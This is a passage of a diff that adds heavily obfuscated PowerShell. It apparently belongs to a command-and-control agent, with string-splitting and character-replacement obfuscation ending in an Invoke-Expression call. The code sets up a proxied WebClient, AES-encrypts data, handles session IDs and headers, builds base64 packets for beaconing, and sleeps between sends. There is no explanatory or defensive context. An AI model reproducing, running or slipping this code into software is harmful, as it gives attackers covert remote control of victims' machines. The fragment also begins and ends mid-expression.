+            Bsn{Wnwqc} = &(WA8New-OWA8+WA8bjeWA8+WA8ctWA8) (WA8SystWA8+WA8eWA8+WA8m.Net.WA8+WA8WeWA8+WA8bCWA8+WA8lientWA8);
+
+
+            Bsn{Wc}.x6VcpnwqROXyx6Vc = [System.Net.WebRequest]::(WA8GetSyWA8+WA8stemWA8+WA8WebWA8+WA8ProxyWA8).Invoke(','                  [System.Convert]::x6VctOBnwqAsnwqE64nwqstRiNgx6Vc(Bsn{BnwqUfF});
+                        }
+                    }
+                }
+                else{
+                    Bsn{nunwqLl};
+                }
+            }
+        }
+        catch{}
+        finally {
+            Bsn{fnwqRoMFnwqILE}.(WA8CloWA8+WA8seWA8).Invoke();
+        }
+    }
+    function ENCnwqRnwqYPT-bYTes {
+        
+        param(Bsn{BnwqYnwqTeS})
+        Bsn{Iv} = [byte] 0..255 jRbz &(WA8Get-RWA8+WA8anWA8+WA8domWA8) -count 16;
+        try {
+            Bsn{AnwqES}=&(WA8New-WA8+WA8ObWA8+WA8jectWA8) (WA8SWA8+WA8ysteWA8+WA8m.SWA8+WA8eWA8+WA8curity.CryptoWA8+WA8gWA8+WA8raphWA8+WA8yWA8+WA8.AesCryptoSWA8+WA8eWA8+WA8rWA8+WA8viceWA8+WA8ProvWA8+WA8iWA8+WA8derWA8);
+        }
+        catch {
+            Bsn{anwqes}=&(WA8New-WA8+WA8ObWA8+WA8jWA8+WA8ectWA8) (WA8SystemWA8+WA8.SecuWA8+WA8rWA8+WA8ity.Cr','qenwqNt} = Bsn{PnwqRofinwqLEPaRTS}[1];
+        Bsn{SCRIpnwqTnwq:SeSsIonwqNId} = Bsn{SnwqEsnwqSnwqionID};
+        Bsn{SnwqCRiPT:nwqheanwqDers} = @{};
+        if(Bsn{ProFiLEnwqparnwqTS}[2]) {
+            Bsn{pRnwqoFilEpARnwqTS}[2..Bsn{PRnwqOfnwqinwqLEnwqPARtS}.x6VclnwqENnwqGthx6Vc] jRbz &(WA8ForEacWA8+WA8h-WA8+WA8ObjeWA8+WA8ctWA8) {
+                Bsn{pnwqARTS} = Bsn{_}.(WA8SpWA8+WA8litWA8).Invoke(WA','     if (Bsn{DanwqTa} -is [System.Array]) {
+            Bsn{dAnwqTA} = Bsn{dnwqAta} -join x6Vcnwqnx6Vc;
+        }
+        Bsn{DanwqTa} = [System.Convert]::x6VcTobAsE6nwq4nwqSnwqTRiNgx6Vc([System.Text.Encoding]::x6VcutnwqF8x6Vc.(WA8GeWA8+WA8tBytWA8+WA8esWA8).Invoke(Bsn{dnwqATa}));
+        Bsn{pAcnwqKnwqET} = &(WA8NewWA8+WA8-ObjeWA8+WA8ctWA8) (WA8BWA8+WA8yteWA8+WA8[]WA8) (12 + Bsn{dAnwqTa}.x6VcLenwqNnwqGThx6Vc);
+        ([BitConverter]::(WA8GeWA8+WA8tWA8+WA8BytesWA8).Invoke(Bsn{tynwqPE})).(WA8CoWA8+WA8pyToWA8).Invoke(Bsn{pAnwqCkeT}, 0);
+        ([BitConverter]::x6VcGeTnwqBYTESx6Vc([Int16]1)).(WA8CoWA8+WA8pyTWA8+WA8oWA8).Invoke(Bsn{PanwqcKeT}, 2);
+        ([BitConverter]::x6VcGetbynwqTnwqesx6Vc([Int16]1)).(WA8CWA8+WA8opyWA8+WA8ToWA8).Invoke(Bsn{PnwqACknwqEt}, 4);
+        ([BitConverter]::(WA8GeWA8+WA8tBWA8+WA8ytesWA8).Invoke(Bsn{resunwqLnwqTID})).(WA8CWA8+WA8oWA8+WA8pyToWA8).Invoke(Bsn{panwqcknwqET}, 6);
+        ([BitConverter]::(WA8GetByWA8+WA8tesWA8).Invoke(Bsn{dnwqAta}.x6VcLennwqgnwqThx6Vc)).(WA8CopWA8+WA8yToWA8).Invoke(Bsn{PAcKnwqet}, 8);
+        ([System.Text.Encoding]::x6VcutnwqF8x6Vc.(WA8GetByteWA8+WA8sWA8).Invoke(Bsn{dAnwqTa})).(WA8CopyTWA8+WA8oWA8).Invoke(Bsn{PAcnwqknwqET}, 12);
+        Bsn{pnwqACnwqket};
+        &(WA8StaWA8+WA8rt-WA8+WA8SleepWA8) -Seconds 1.5
+    }
+    function decoDenwq-nwqPnwqAckET {
+        param(Bsn{paCnwqKnwqet}, Bsn{oFfnwqset}=0)
+        Bsn{tynwqpe} = [BitConverter]::(WA8ToUIntWA8+WA81WA8+WA86WA8).Invok'))  -rEplACE ([ChaR]50+[ChaR]49+[ChaR]52+[ChaR]77),[ChaR]92 -CREplaCE  ([ChaR]106+[ChaR]82+[ChaR]98+[ChaR]122),[ChaR]124-rEplACE ([ChaR]120+[ChaR]54+[ChaR]86+[ChaR]99),[ChaR]34  -rEplACE([ChaR]87+[ChaR]65+[ChaR]56),[ChaR]39 -CREplaCE([ChaR]66+[ChaR]115+[ChaR]110),[ChaR]36 -CREplaCE([ChaR]110+[ChaR]119+[ChaR]113),[ChaR]96) |.( $SHeLLID[1]+$sHElLid[13]+'X')
